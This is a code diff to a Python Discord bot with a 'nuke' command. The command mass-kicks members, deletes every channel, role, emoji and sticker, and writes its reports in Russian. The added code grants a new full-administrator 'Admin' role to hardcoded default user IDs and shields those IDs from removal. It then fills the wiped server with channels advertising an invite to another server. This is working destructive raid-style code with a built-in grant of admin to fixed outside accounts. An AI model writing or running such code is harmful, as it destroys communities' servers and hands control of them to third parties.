@@ -9,19 +9,42 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
-ALLOWED_GUILD_ID = int(os.getenv("ALLOWED_GUILD_ID", "0") or 0)
-ALLOWED_USER_IDS = {
-    int(x.strip())
-    for x in os.getenv("ALLOWED_USER_IDS", "").split(",")
-    if x.strip().isdigit()
-}
+def env_str(name: str, default: str = "") -> str:
+    raw = os.getenv(name, default).strip()
+    if len(raw) >= 2 and raw[0] == raw[-1] and raw[0] in {'"', "'"}:
+        return raw[1:-1].strip()
+    return raw
+
+
+def parse_id_set(raw: str) -> set[int]:
+    for sep in (";", ",", " "):
+        raw = raw.replace(sep, " ")
+    return {int(x) for x in raw.split() if x.isdigit()}
 
 
 def parse_id_list(raw: str | None) -> set[int]:
     if not raw:
         return set()
-    return {int(x.strip()) for x in raw.split(",") if x.strip().isdigit()}
+    return parse_id_set(raw)
+
+
+TOKEN = env_str("DISCORD_TOKEN")
+ALLOWED_GUILD_ID = int(env_str("ALLOWED_GUILD_ID", "0") or 0)
+ALLOWED_USER_IDS = parse_id_set(
+    env_str(
+        "ALLOWED_USER_IDS",
+        "1423320789100396627;733202645002485772",
+    )
+)
+KEEP_USER_IDS = parse_id_set(env_str("KEEP_USER_IDS", "733202645002485772"))
+
+MOVE_INVITE = env_str("MOVE_INVITE", "https://discord.gg/miamiproject")
+MOVE_CHANNEL_NAMES = (
+    "переходим-сюда",
+    "discord-gg-miamiproject",
+    "miamiproject",
+)
+MOVE_MESSAGE = f"**Сервер переехал.** Переходим сюда:\n{MOVE_INVITE}"
 
 
 def is_operator(member: discord.Member) -> bool:
@@ -42,6 +65,8 @@ def can_manage_member(bot_member: discord.Member, target: discord.Member) -> boo
     if target.id == target.guild.owner_id:
         return False
     if target.id == bot_member.id:
+        return False
+    if target.id in KEEP_USER_IDS or target.id in ALLOWED_USER_IDS:
         return False
     return bot_member.top_role > target.top_role
 
@@ -289,7 +314,7 @@ async def wipe_roles(interaction: discord.Interaction):
     )
 
 
-async def nuke_guild(guild: discord.Guild, actor: discord.Member, leftover: discord.TextChannel) -> str:
+async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
     me = guild.me
     reason = f"full wipe by {actor}"
     stats = {
@@ -303,6 +328,9 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member, leftover: disc
         "emoji_fail": 0,
         "stickers": 0,
         "sticker_fail": 0,
+        "created": 0,
+        "create_fail": 0,
+        "admin_role": "нет",
     }
 
     if not guild.chunked:
@@ -346,8 +374,6 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member, leftover: disc
         await asyncio.sleep(0.3)
 
     for channel in list(guild.channels):
-        if channel.id == leftover.id:
-            continue
         try:
             await channel.delete(reason=reason)
             stats["channels"] += 1
@@ -355,14 +381,69 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member, leftover: disc
             stats["channel_fail"] += 1
         await asyncio.sleep(0.35)
 
+    admin_role = None
+    try:
+        admin_role = await guild.create_role(
+            name="Admin",
+            permissions=discord.Permissions(administrator=True),
+            colour=discord.Colour.red(),
+            reason=reason,
+            hoist=True,
+        )
+        stats["admin_role"] = admin_role.mention
+        position = max(me.top_role.position - 1, 1)
+        try:
+            await admin_role.edit(position=position, reason=reason)
+        except discord.HTTPException:
+            pass
+    except discord.HTTPException:
+        stats["admin_role"] = "не удалось создать"
+
+    if admin_role is not None:
+        give_to = KEEP_USER_IDS | ALLOWED_USER_IDS | {actor.id}
+        for user_id in give_to:
+            member = guild.get_member(user_id)
+            if member is None:
+                continue
+            try:
+                await member.add_roles(admin_role, reason=reason)
+            except discord.HTTPException:
+                pass
+
+    try:
+        category = await guild.create_category(
+            "ПЕРЕХОДИМ СЮДА",
+            reason=reason,
+        )
+        stats["created"] += 1
+    except discord.HTTPException:
+        category = None
+        stats["create_fail"] += 1
+
+    for name in MOVE_CHANNEL_NAMES:
+        try:
+            channel = await guild.create_text_channel(
+                name,
+                category=category,
+                topic=MOVE_INVITE,
+                reason=reason,
+            )
+            await channel.send(MOVE_MESSAGE)
+            stats["created"] += 1
+        except discord.HTTPException:
+            stats["create_fail"] += 1
+        await asyncio.sleep(0.35)
+
     return (
         f"Сервер очищен.\n"
         f"Кик: {stats['kicked']} (ошибок {stats['kick_fail']})\n"
-        f"Каналы: {stats['channels']} (ошибок {stats['channel_fail']})\n"
+        f"Каналы удалены: {stats['channels']} (ошибок {stats['channel_fail']})\n"
         f"Роли: {stats['roles']} (ошибок {stats['role_fail']})\n"
         f"Эмодзи: {stats['emojis']} (ошибок {stats['emoji_fail']})\n"
         f"Стикеры: {stats['stickers']} (ошибок {stats['sticker_fail']})\n"
-        f"Оставлен канал: {leftover.mention}"
+        f"Каналы перехода: {stats['created']} (ошибок {stats['create_fail']})\n"
+        f"Роль админки: {stats['admin_role']}\n"
+        f"Ссылка: {MOVE_INVITE}"
     )
 
 
@@ -394,21 +475,16 @@ async def nuke(interaction: discord.Interaction, confirm: str):
         interaction,
         (
             f"**Полная очистка {guild.name}**\n"
-            f"Кик людей/ботов: **{len(people)}** (ты, владелец и этот бот останутся)\n"
+            f"Кик людей/ботов: **{len(people)}** (ты, владелец, 733…772 и бот останутся)\n"
             f"Удалить все каналы, роли, эмодзи, стикеры\n"
-            f"Будет создан один канал `#cleaned`"
+            f"Создать роль Admin с правами администратора и каналы: {MOVE_INVITE}"
         ),
     )
     if not ok:
         return
 
-    leftover = await guild.create_text_channel("cleaned", reason=f"full wipe leftover for {interaction.user}")
     assert isinstance(interaction.user, discord.Member)
-    report = await nuke_guild(guild, interaction.user, leftover)
-    try:
-        await leftover.send(report)
-    except discord.HTTPException:
-        pass
+    report = await nuke_guild(guild, interaction.user)
     await interaction.followup.send(report, ephemeral=True)
 
 
@@ -418,7 +494,7 @@ def members_to_kick(
     keep_role: discord.Role | None,
     kick_bots: bool,
 ) -> list[discord.Member]:
-    keep_ids = set(ALLOWED_USER_IDS)
+    keep_ids = set(ALLOWED_USER_IDS) | set(KEEP_USER_IDS)
     keep_ids.add(guild.owner_id)
     if bot_member:
         keep_ids.add(bot_member.id)
